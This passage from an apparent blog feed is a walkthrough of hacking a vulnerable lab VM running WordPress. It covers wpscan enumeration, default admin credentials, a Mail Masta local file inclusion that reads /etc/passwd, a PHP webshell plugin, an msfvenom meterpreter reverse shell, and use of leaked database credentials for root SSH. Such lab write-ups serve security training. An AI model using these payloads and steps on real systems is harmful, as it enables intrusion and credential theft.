|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery:
|   OS: Unix (Samba 3.6.3)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2017-06-08T01:58:45-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn&#x27;t support SMBv2 protocol

TRACEROUTE (using port 256&#x2F;tcp)
HOP RTT     ADDRESS
1   0.05 ms 172.17.0.1
2   0.94 ms 192.168.171.128

NSE: Script Post-scanning.
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Initiating NSE at 05:58
Completed NSE at 05:58, 0.00s elapsed
Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap
OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
Raw packets sent: 1066 (50.324KB) | Rcvd: 1034 (42.024KB)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;dirbuster&quot;&gt;dirbuster&lt;&#x2F;h2&gt;
&lt;p&gt;The VM mentions using dirbuster, so I fired that up with the default wordlists and let it go.&lt;&#x2F;p&gt;
&lt;p&gt;Looks like there are 2 web apps running:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Wordpress -- &#x2F;wordpress
Lepton CMS 2 -- &#x2F;upload&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;lepton-cms&quot;&gt;Lepton CMS&lt;&#x2F;h2&gt;
&lt;p&gt;I tried lepton first and it seemed like it wasn&#x27;t exactly working, possibly my VM setup.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;wordpress&quot;&gt;Wordpress&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wpscan --url 10.37.129.6&#x2F;wordpress --wordlist &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;wfuzz&#x2F;others&#x2F;common_pass.txt -e --random-agent --proxy 192.168.0.9:8080
_______________________________________________________________
        __          _______   _____
        \ \        &#x2F; &#x2F;  __ \ &#x2F; ____|
         \ \  &#x2F;\  &#x2F; &#x2F;| |__) | (___   ___  __ _ _ __ ®
          \ \&#x2F;  \&#x2F; &#x2F; |  ___&#x2F; \___ \ &#x2F; __|&#x2F; _` | &#x27;_ \
           \  &#x2F;\  &#x2F;  | |     ____) | (__| (_| | | | |
            \&#x2F;  \&#x2F;   |_|    |_____&#x2F; \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.2
          Sponsored by Sucuri - https:&#x2F;&#x2F;sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;
[+] Started: Fri Jun 23 04:48:39 2017

[!] The WordPress &#x27;http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;readme.html&#x27; file exists exposing a version number
[+] Interesting header: SERVER: Apache&#x2F;2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP&#x2F;5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;xmlrpc.php
[!] Upload directory has directory listing enabled: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;
[!] Includes directory has directory listing enabled: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-includes&#x2F;

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 15 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8716
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;blob&#x2F;c9ea1de1441bb3bda133bf72d513ca9de66566c2&#x2F;wp-admin&#x2F;update-core.php
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-1-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8718
    Reference: https:&#x2F;&#x2F;www.mehmetince.net&#x2F;low-severity-wordpress&#x2F;
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-1-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;ce7fb2934dd111e6353784852de8aea2a938b359
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5490
[i] Fixed in: 3.9.15

[!] Title: WordPress &lt;= 4.7 - Post via Email Checks mail.example.com by Default
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8719
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;061e8788814ac87706d8b95688df276fe3c8596a
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-1-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5491
[i] Fixed in: 3.9.15

[!] Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8720
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;03e5c0314aeffe6b27f4b98fef842bf0fb00c733
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-1-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8721
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-1-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 3.9.15

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8730
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;01&#x2F;wordpress-4-7-2-security-release&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;85384297a60900004e27e417eac56d24267054cb
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 3.9.16

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8765
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;03&#x2F;wordpress-4-7-3-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https:&#x2F;&#x2F;sumofpwn.nl&#x2F;advisory&#x2F;2016&#x2F;wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http:&#x2F;&#x2F;seclists.org&#x2F;oss-sec&#x2F;2017&#x2F;q1&#x2F;563
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8766
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;03&#x2F;wordpress-4-7-3-security-and-maintenance-release&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 3.9.17

[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8807
    Reference: https:&#x2F;&#x2F;exploitbox.io&#x2F;vuln&#x2F;WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http:&#x2F;&#x2F;blog.dewhurstsecurity.com&#x2F;2017&#x2F;05&#x2F;04&#x2F;exploitbox-wordpress-security-advisories.html
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8815
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9066
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8816
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;3d95e3ae816f4d7c638f40d3e936a4be19724381
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9062
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8817
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;e88a48a066ab2200ce3091b131d43e2fab2460a4
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9065
[i] Fixed in: 3.9.19

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8818
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;38347d7c580be4cdd8476e4bbc653d5c79ed9b67
    Reference: https:&#x2F;&#x2F;sumofpwn.nl&#x2F;advisory&#x2F;2016&#x2F;cross_site_request_forgery_in_wordpress_connection_information.html
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9064
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8819
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9061
[i] Fixed in: 3.9.19

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS &amp; CSRF
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8820
    Reference: https:&#x2F;&#x2F;wordpress.org&#x2F;news&#x2F;2017&#x2F;05&#x2F;wordpress-4-7-5&#x2F;
    Reference: https:&#x2F;&#x2F;github.com&#x2F;WordPress&#x2F;WordPress&#x2F;commit&#x2F;3d10fef22d788f29aed745b0f5ff6f6baea69af3
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-9063
[i] Fixed in: 3.9.19

[+] WordPress theme in use: twentyfourteen - v1.1

[+] Name: twentyfourteen - v1.1
 |  Location: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;
[!] The version is out of date, the latest version is 2.0
 |  Style URL: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;style.css
 |  Referenced style.css: wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;style.css
 |  Theme Name: Twenty Fourteen
 |  Theme URI: http:&#x2F;&#x2F;wordpress.org&#x2F;themes&#x2F;twentyfourteen
 |  Description: In 2014, our default theme lets you create a responsive magazine website with a sleek, modern des...
 |  Author: the WordPress team
 |  Author URI: http:&#x2F;&#x2F;wordpress.org&#x2F;

[+] Enumerating installed plugins (only ones with known vulnerabilities) ...

   Time: 00:00:12 &lt;=====================================================================================================================================================================================&gt; (1523 &#x2F; 1523) 100.00% Time: 00:00:12

[+] We found 2 plugins:

[+] Name: akismet - v3.0.1
 |  Location: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;
 |  Readme: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;readme.txt
[!] The version is out of date, the latest version is 3.3.2

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8215
    Reference: http:&#x2F;&#x2F;blog.akismet.com&#x2F;2015&#x2F;10&#x2F;13&#x2F;akismet-3-1-5-wordpress&#x2F;
    Reference: https:&#x2F;&#x2F;blog.sucuri.net&#x2F;2015&#x2F;10&#x2F;security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Name: mail-masta - v1.0
 |  Latest version: 1.0 (up to date)
 |  Location: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;
 |  Readme: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;readme.txt
[!] Directory listing is enabled: http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;

[!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8609
    Reference: https:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2016080220
    Reference: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;40290&#x2F;

[!] Title: Mail Masta 1.0 - Multiple SQL Injection
    Reference: https:&#x2F;&#x2F;wpvulndb.com&#x2F;vulnerabilities&#x2F;8740
    Reference: https:&#x2F;&#x2F;github.com&#x2F;hamkovic&#x2F;Mail-Masta-Wordpress-Plugin
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6095
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6096
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6097
    Reference: https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2017-6098

[+] Enumerating installed themes (only ones with known vulnerabilities) ...

   Time: 00:00:03 &lt;=======================================================================================================================================================================================&gt; (280 &#x2F; 280) 100.00% Time: 00:00:03

[+] No themes found

[+] Enumerating timthumb files ...

   Time: 00:00:27 &lt;=====================================================================================================================================================================================&gt; (2541 &#x2F; 2541) 100.00% Time: 00:00:27

[+] No timthumb files found

[+] Enumerating usernames ...
[+] Identified the following 2 user&#x2F;s:
    +----+--------+--------+
    | Id | Login  | Name   |
    +----+--------+--------+
    | 1  | admin  | admin  |
    | 2  | wpuser | wpuser |
    +----+--------+--------+
[!] Default first WordPress username &#x27;admin&#x27; is still used
[+] Starting the password brute forcer
  [!] ERROR: We received an unknown response for admin...
  Brute Forcing &#x27;admin&#x27; Time: 00:00:02 &lt;====================================================================================================================================================================&gt; (52 &#x2F; 52) 100.00% Time: 00:00:02

  Brute Forcing &#x27;wpuser&#x27; Time: 00:00:02 &lt;===================================================================================================================================================================&gt; (52 &#x2F; 52) 100.00% Time: 00:00:02


  +----+--------+--------+----------+
  | Id | Login  | Name   | Password |
  +----+--------+--------+----------+
  | 1  | admin  | admin  |          |
  | 2  | wpuser | wpuser |          |
  +----+--------+--------+----------+

[+] Finished: Fri Jun 23 04:49:31 2017
[+] Requests Done: 4523
[+] Memory used: 168.398 MB
[+] Elapsed time: 00:00:52
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Try logging in as admin:admin, works&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;10.37.129.6&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl=&#x2F;etc&#x2F;passwd
*   Trying 10.37.129.6...
* TCP_NODELAY set
* Connected to 10.37.129.6 (10.37.129.6) port 80 (#0)
&gt; GET &#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl=&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1
&gt; Host: 10.37.129.6
&gt; User-Agent: curl&#x2F;7.51.0
&gt; Accept: *&#x2F;*
&gt;
* HTTP 1.0, assume close after body
&lt; HTTP&#x2F;1.0 500 Internal Server Error
&lt; Date: Sat, 10 Jun 2017 03:27:17 GMT
&lt; Server: Apache&#x2F;2.2.22 (Ubuntu)
&lt; X-Powered-By: PHP&#x2F;5.3.10-1ubuntu3
&lt; Vary: Accept-Encoding
&lt; Content-Length: 1745
&lt; Connection: close
&lt; Content-Type: text&#x2F;html
&lt;
root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;bin&#x2F;sh
bin:x:2:2:bin:&#x2F;bin:&#x2F;bin&#x2F;sh
sys:x:3:3:sys:&#x2F;dev:&#x2F;bin&#x2F;sh
sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;bin&#x2F;sh
man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;bin&#x2F;sh
lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;bin&#x2F;sh
mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;bin&#x2F;sh
news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;bin&#x2F;sh
uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;bin&#x2F;sh
proxy:x:13:13:proxy:&#x2F;bin:&#x2F;bin&#x2F;sh
www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;bin&#x2F;sh
backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;bin&#x2F;sh
list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;bin&#x2F;sh
irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;bin&#x2F;sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;bin&#x2F;sh
nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;bin&#x2F;sh
libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:&#x2F;bin&#x2F;sh
syslog:x:101:103::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
mysql:x:102:105:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
messagebus:x:103:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
colord:x:104:109:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false
whoopsie:x:105:112::&#x2F;nonexistent:&#x2F;bin&#x2F;false
avahi:x:106:115:Avahi mDNS daemon,,,:&#x2F;var&#x2F;run&#x2F;avahi-daemon:&#x2F;bin&#x2F;false
bind:x:107:117::&#x2F;var&#x2F;cache&#x2F;bind:&#x2F;bin&#x2F;false
postfix:x:108:118::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;bin&#x2F;false
dovecot:x:109:120:Dovecot mail server,,,:&#x2F;usr&#x2F;lib&#x2F;dovecot:&#x2F;bin&#x2F;false
dovenull:x:110:65534:Dovecot login user,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false
landscape:x:111:121::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false
libvirt-qemu:x:112:106:Libvirt Qemu,,,:&#x2F;var&#x2F;lib&#x2F;libvirt:&#x2F;bin&#x2F;false
libvirt-dnsmasq:x:113:123:Libvirt Dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;libvirt&#x2F;dnsmasq:&#x2F;bin&#x2F;false
sshd:x:114:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
postgres:x:115:124:PostgreSQL administrator,,,:&#x2F;var&#x2F;lib&#x2F;postgresql:&#x2F;bin&#x2F;bash
tomcat6:x:116:126::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false
wpadmin:x:1001:1001::&#x2F;home&#x2F;wpadmin:&#x2F;bin&#x2F;sh
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Still no way to get a password.&lt;&#x2F;p&gt;
&lt;p&gt;Next I realized as an administrator I can install plugins.  So I made a simple webshell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;?php
&#x2F;*
 * Plugin Name: backdoor
 * Plugin URI: https:&#x2F;&#x2F;www.com
 * Description: backdoor
 * Version: 1.0.0
 * Author: backdoor
 * Author URI: http:&#x2F;&#x2F;www.com
 * Text Domain: backdoor
 * Domain Path: &#x2F;languages
 * *&#x2F;

echo system($_GET[&quot;cmd&quot;]); 
?&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Once actived I was able to execute code. Now for a meterpreter payload and serve it up with SimpleHTTPServer&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST=111.111.111.111 LPORT=444 R &gt; backdoor.php
pythom -m SimpleHTTPServer
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then I can use my plugin to get the payload onto the web server and start metasploit:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole
use exploit&#x2F;multi&#x2F;handler
set LHOST 111.111.111.111
set LPORT 4444
set payload php&#x2F;meterpreter&#x2F;reverse_tcp
exploit
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now that the meterpreter handler is running I can fire up the shell and now we have the first flag.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;privesc&quot;&gt;PrivEsc&lt;&#x2F;h2&gt;
&lt;p&gt;Now that I have shell:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;home&#x2F;wpadmin&#x2F;flag.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cd ..&#x2F;..&#x2F;..&#x2F;..&#x2F;
pwd
&#x2F;var&#x2F;www&#x2F;wordpress
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now that we are in the Wordpress root let&#x27;s look at the config file and see what the database credentials are:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat wp-config.php
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&#x2F;** MySQL database username *&#x2F;
define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);

&#x2F;** MySQL database password *&#x2F;
define(&#x27;DB_PASSWORD&#x27;, &#x27;rootpassword!&#x27;);
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to test:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh root@vm
pass: rootpassword!
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And we&#x27;re in, do a quick ls and see the flag:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;root&#x2F;flag.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Lastly:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat &#x2F;etc&#x2F;cron.d&#x2F;php5
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Damn vulnerable-web-app</title>
		<published>2017-05-31T00:00:00+00:00</published>
		<updated>2017-05-31T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/damn-vulnerable-web-app/" type="text/html"/>
		<id>https://m4l1c3.github.io/damn-vulnerable-web-app/</id>
		<content type="html">&lt;h1 id=&quot;brute-force&quot;&gt;Brute force&lt;&#x2F;h1&gt;
